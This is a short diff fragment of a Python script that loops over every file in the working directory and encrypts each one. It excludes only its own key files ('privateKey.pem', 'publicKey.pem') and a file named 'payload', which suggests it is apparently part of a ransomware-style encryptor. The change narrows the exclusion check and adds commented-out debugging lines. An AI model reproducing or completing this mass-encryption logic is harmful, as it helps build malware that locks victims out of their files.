@@ -51,7 +51,9 @@ allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f
 # Loop for each file
 for filePath in allFileNames:
     # Do not encrypt the private key
-    if( not (filePath.endswith("pem") or filePath.startswith("payload"))):
+    #  print(filePath)
+    #  pdb.set_trace()
+    if ((filePath != "privateKey.pem") and (filePath != "payload") and (filePath != "publicKey.pem")):
         print("Encrypting: " + filePath)
 
         # Call the encryptor
